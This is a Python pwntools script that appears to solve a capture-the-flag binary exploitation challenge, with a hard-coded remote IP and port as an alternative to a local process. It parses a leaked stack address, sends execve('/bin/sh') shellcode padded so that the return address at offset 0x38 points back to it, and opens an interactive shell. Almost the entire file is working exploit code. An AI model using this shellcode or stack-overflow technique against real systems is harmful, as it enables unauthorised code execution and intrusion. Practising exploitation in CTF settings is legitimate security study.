#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('app')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" app
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('51.124.222.205', 13370)
# do leak / payload gen here

payload = b''
prompt = p.recvuntil(b'Choose one:')
leak = int(re.search(b'(0x[a-f0-9]+)', prompt)[0], 0)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendlineafter(b'> ', b'1')
# p.sendlineafter(b'> ', payload + b'A'*9+p64(leak)+ p64(leak+8))# b'A'*(0x1e+1))
payload = flat({0: shellcode,
                0x38: [leak]})
p.sendlineafter(b'> ', payload)
p.interactive()
